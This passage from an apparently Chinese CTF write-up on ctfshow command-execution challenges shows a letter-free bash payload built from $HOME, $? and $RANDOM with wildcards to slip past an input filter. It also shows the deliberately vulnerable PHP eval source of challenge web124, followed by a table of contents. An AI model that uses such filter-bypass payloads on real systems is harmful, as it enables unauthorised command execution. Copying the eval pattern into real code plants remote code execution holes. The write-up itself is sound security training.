deadlock; Retry transaction&quot;</span><br><span class="line">&quot;MySQL error code 150: Foreign key constraint is incorrectly formed&quot;</span><br><span class="line">&quot;MySQL error code 151: Cannot add a child row&quot;</span><br><span class="line">&quot;MySQL error code 152: Cannot delete a parent row&quot;</span><br></pre></td></tr></table></figure>

<p>我们关注能返回1的命令就行，其实就是权限问题，但是很多权限的命令都是有字母的，然后看到了一个&lt;A是可以返回1的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload：（$&#123;Z&#125;代表0）</span><br><span class="line"></span><br><span class="line">code=&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span><br><span class="line"></span><br><span class="line">code=&lt;A;$&#123;HOME:$&#123;Z&#125;:$?&#125;???$&#123;HOME:$&#123;Z&#125;:$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span><br></pre></td></tr></table></figure>

<p>这里的话也是有概率的，需要多次刷新</p>
<h1 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">H0me</a></li>
        
          <li><a href="/about/">A6out</a></li>
        
          <li><a href="/tags/">T6gs</a></li>
        
          <li><a href="/categories/">Catagory</a></li>
        
          <li><a href="/links/">L1nks</a></li>
        
          <li><a href="/search/">s4arch</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">0x01基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">2.函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.</span> <span class="toc-text">3.远程命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E9%A2%98%E7%9B%AE"><span class="toc-number">2.</span> <span class="toc-text">0x02题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web29"><span class="toc-number">2.1.</span> <span class="toc-text">web29</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87flag"><span class="toc-number">2.1.1.</span> <span class="toc-text">#绕过flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#preg-match-%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.2.</span> <span class="toc-text">preg_match ()函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web30"><span class="toc-number">2.2.</span> <span class="toc-text">web30</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87system"><span class="toc-number">2.2.1.</span> <span class="toc-text">#绕过system</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web31"><span class="toc-number">2.3.</span> <span class="toc-text">web31</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87cat%E5%92%8Cphp"><span class="toc-number">2.3.1.</span> <span class="toc-text">#绕过cat和php</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web32"><span class="toc-number">2.4.</span> <span class="toc-text">web32</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%B8%A6%E5%8F%82%E6%95%B0%E8%BE%93%E5%85%A5"><span class="toc-number">2.4.1.</span> <span class="toc-text">1.带参数输入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.日志注入:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web33"><span class="toc-number">2.5.</span> <span class="toc-text">web33</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web34"><span class="toc-number">2.6.</span> <span class="toc-text">web34</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web35"><span class="toc-number">2.7.</span> <span class="toc-text">web35</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web36"><span class="toc-number">2.8.</span> <span class="toc-text">web36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web37"><span class="toc-number">2.9.</span> <span class="toc-text">web37</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#include%E5%8C%85%E5%90%AB"><span class="toc-number">2.9.1.</span> <span class="toc-text">#include包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#include%E5%87%BD%E6%95%B0"><span class="toc-number">2.9.2.</span> <span class="toc-text">include函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web38"><span class="toc-number">2.10.</span> <span class="toc-text">web38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web39"><span class="toc-number">2.11.</span> <span class="toc-text">web39</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#include%E5%8C%85%E5%90%AB-php"><span class="toc-number">2.11.1.</span> <span class="toc-text">#include包含.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#include-c-%E2%80%9D-php%E2%80%9D"><span class="toc-number">2.11.2.</span> <span class="toc-text">include($c.”.php”);</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web40"><span class="toc-number">2.12.</span> <span class="toc-text">web40</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0rce"><span class="toc-number">2.12.1.</span> <span class="toc-text">#无参数rce</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web41"><span class="toc-number">2.13.</span> <span class="toc-text">web41</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%96%E8%BF%90%E7%AE%97"><span class="toc-number">2.13.1.</span> <span class="toc-text">#或运算</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web42"><span class="toc-number">2.14.</span> <span class="toc-text">web42</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E4%B8%A2%E5%BC%83%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">2.14.1.</span> <span class="toc-text">#重定向丢弃的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-%E9%80%9A%E9%81%93%E7%AC%A6"><span class="toc-number">2.14.2.</span> <span class="toc-text">知识点:通道符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">2.14.3.</span> <span class="toc-text">知识点:重定向</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web43"><span class="toc-number">2.15.</span> <span class="toc-text">web43</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">2.15.1.</span> <span class="toc-text">#过滤+重定向</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web44"><span class="toc-number">2.16.</span> <span class="toc-text">web44</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web45"><span class="toc-number">2.17.</span> <span class="toc-text">web45</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web46"><span class="toc-number">2.18.</span> <span class="toc-text">web46</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wbe47"><span class="toc-number">2.19.</span> <span class="toc-text">wbe47</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web48"><span class="toc-number">2.20.</span> <span class="toc-text">web48</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web49"><span class="toc-number">2.21.</span> <span class="toc-text">web49</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web50"><span class="toc-number">2.22.</span> <span class="toc-text">web50</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web51"><span class="toc-number">2.23.</span> <span class="toc-text">web51</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web52"><span class="toc-number">2.24.</span> <span class="toc-text">web52</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web53"><span class="toc-number">2.25.</span> <span class="toc-text">web53</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web54"><span class="toc-number">2.26.</span> <span class="toc-text">web54</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-uniq"><span class="toc-number">2.26.1.</span> <span class="toc-text">知识点:uniq</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-grep%E7%9A%84%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9%E4%B8%8E%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.26.2.</span> <span class="toc-text">知识点:grep的常用选项与示例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web55"><span class="toc-number">2.27.</span> <span class="toc-text">web55</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8Drce"><span class="toc-number">2.27.1.</span> <span class="toc-text">#无字母rce</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web56"><span class="toc-number">2.28.</span> <span class="toc-text">web56</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRce"><span class="toc-number">2.28.1.</span> <span class="toc-text">#无数字字母Rce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">2.28.2.</span> <span class="toc-text">解题思路:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web57"><span class="toc-number">2.29.</span> <span class="toc-text">web57</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-%E5%88%A9%E7%94%A8linux%E7%9A%84-%E6%9E%84%E9%80%A0%E5%87%BA36"><span class="toc-number">2.29.1.</span> <span class="toc-text">解题思路:利用linux的$(())构造出36</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web58-65"><span class="toc-number">2.30.</span> <span class="toc-text">web58-65</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eval-%E5%87%BD%E6%95%B0"><span class="toc-number">2.31.</span> <span class="toc-text">eval()函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%A4%E7%A7%8D%E8%A7%A3%E6%B3%95"><span class="toc-number">2.32.</span> <span class="toc-text">两种解法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#highlight-file%E5%87%BD%E6%95%B0%E6%9F%A5%E7%9C%8B"><span class="toc-number">2.32.1.</span> <span class="toc-text">highlight_file函数查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#include-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.32.2.</span> <span class="toc-text">include+伪协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96"><span class="toc-number">2.32.3.</span> <span class="toc-text">无参数读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#show-source-%E5%87%BD%E6%95%B0"><span class="toc-number">2.32.4.</span> <span class="toc-text">show_source()函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web66"><span class="toc-number">3.</span> <span class="toc-text">web66</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#scandir-%E5%87%BD%E6%95%B0"><span class="toc-number">3.0.1.</span> <span class="toc-text">scandir()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#readdir-%E5%87%BD%E6%95%B0"><span class="toc-number">3.0.2.</span> <span class="toc-text">readdir()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#opendir-%E5%87%BD%E6%95%B0"><span class="toc-number">3.0.3.</span> <span class="toc-text">opendir()函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web67"><span class="toc-number">4.</span> <span class="toc-text">web67</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#print-r-%E5%87%BD%E6%95%B0%E6%9B%BF%E6%8D%A2%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">print_r()函数替换函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#var-dump"><span class="toc-number">4.1.1.</span> <span class="toc-text">var_dump()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#var-export"><span class="toc-number">4.1.2.</span> <span class="toc-text">var_export()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web68"><span class="toc-number">5.</span> <span class="toc-text">web68</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#readgzfile-%E5%87%BD%E6%95%B0"><span class="toc-number">5.0.1.</span> <span class="toc-text">readgzfile()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#require-%E5%87%BD%E6%95%B0"><span class="toc-number">5.0.2.</span> <span class="toc-text">require()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#include-%E5%87%BD%E6%95%B0"><span class="toc-number">5.0.3.</span> <span class="toc-text">include()函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web69"><span class="toc-number">6.</span> <span class="toc-text">web69</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web70"><span class="toc-number">7.</span> <span class="toc-text">web70</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#error-reporting-%E5%87%BD%E6%95%B0"><span class="toc-number">7.0.1.</span> <span class="toc-text">error_reporting() 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ini-set-%E5%87%BD%E6%95%B0"><span class="toc-number">7.0.2.</span> <span class="toc-text">ini_set()函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web71"><span class="toc-number">8.</span> <span class="toc-text">web71</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#s-ob-get-contents"><span class="toc-number">8.0.1.</span> <span class="toc-text">$s &#x3D; ob_get_contents();</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ob-end-clean"><span class="toc-number">8.0.2.</span> <span class="toc-text">ob_end_clean();</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E7%BC%93%E5%86%B2%E5%8C%BA%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-number">8.0.3.</span> <span class="toc-text">对缓冲区的理解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8E%E7%BB%95%E8%BF%87%E7%BC%93%E5%86%B2%E5%8C%BA"><span class="toc-number">8.1.</span> <span class="toc-text">对于绕过缓冲区</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%8F%90%E5%89%8D%E9%80%81%E5%87%BA%E7%BC%93%E5%86%B2%E5%8C%BA"><span class="toc-number">8.1.1.</span> <span class="toc-text">1.提前送出缓冲区</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ob-flush-%E5%87%BD%E6%95%B0"><span class="toc-number">8.1.1.1.</span> <span class="toc-text">ob_flush()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flush-%E5%87%BD%E6%95%B0"><span class="toc-number">8.1.1.2.</span> <span class="toc-text">flush()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ob-end-flush-%E5%87%BD%E6%95%B0"><span class="toc-number">8.1.1.3.</span> <span class="toc-text">ob_end_flush()函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%BB%93%E6%9D%9F%E7%A8%8B%E5%BA%8F"><span class="toc-number">8.1.2.</span> <span class="toc-text">2.结束程序</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exit-%E5%87%BD%E6%95%B0"><span class="toc-number">8.1.2.1.</span> <span class="toc-text">exit()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#die-%E5%87%BD%E6%95%B0"><span class="toc-number">8.1.2.2.</span> <span class="toc-text">die()函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web72"><span class="toc-number">8.2.</span> <span class="toc-text">web72</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%89%AB%E6%8F%8F"><span class="toc-number">8.2.1.</span> <span class="toc-text">1、目录文件扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UAF%E8%84%9A%E6%9C%AC"><span class="toc-number">8.2.2.</span> <span class="toc-text">UAF脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web73%E2%80%9374"><span class="toc-number">9.</span> <span class="toc-text">web73–74</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web75%E2%80%9376"><span class="toc-number">10.</span> <span class="toc-text">web75–76</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LOAD-FILE-%E5%87%BD%E6%95%B0"><span class="toc-number">10.0.1.</span> <span class="toc-text">LOAD_FILE()函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web77"><span class="toc-number">11.</span> <span class="toc-text">web77</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FFI%E5%8E%9F%E7%90%86"><span class="toc-number">11.0.1.</span> <span class="toc-text">FFI原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web118"><span class="toc-number">12.</span> <span class="toc-text">web118</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87"><span class="toc-number">12.1.</span> <span class="toc-text">#内置变量绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web119"><span class="toc-number">13.</span> <span class="toc-text">web119</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web120"><span class="toc-number">14.</span> <span class="toc-text">web120</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web121"><span class="toc-number">15.</span> <span class="toc-text">web121</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web122"><span class="toc-number">16.</span> <span class="toc-text">web122</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web124"><span class="toc-number">17.</span> <span class="toc-text">web124</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/&text=web入门命令执行篇-ctfshow"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/&title=web入门命令执行篇-ctfshow"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/&is_video=false&description=web入门命令执行篇-ctfshow"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=web入门命令执行篇-ctfshow&body=Check out this article: https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/&title=web入门命令执行篇-ctfshow"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/&title=web入门命令执行篇-ctfshow"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/&title=web入门命令执行篇-ctfshow"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/&title=web入门命令执行篇-ctfshow"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
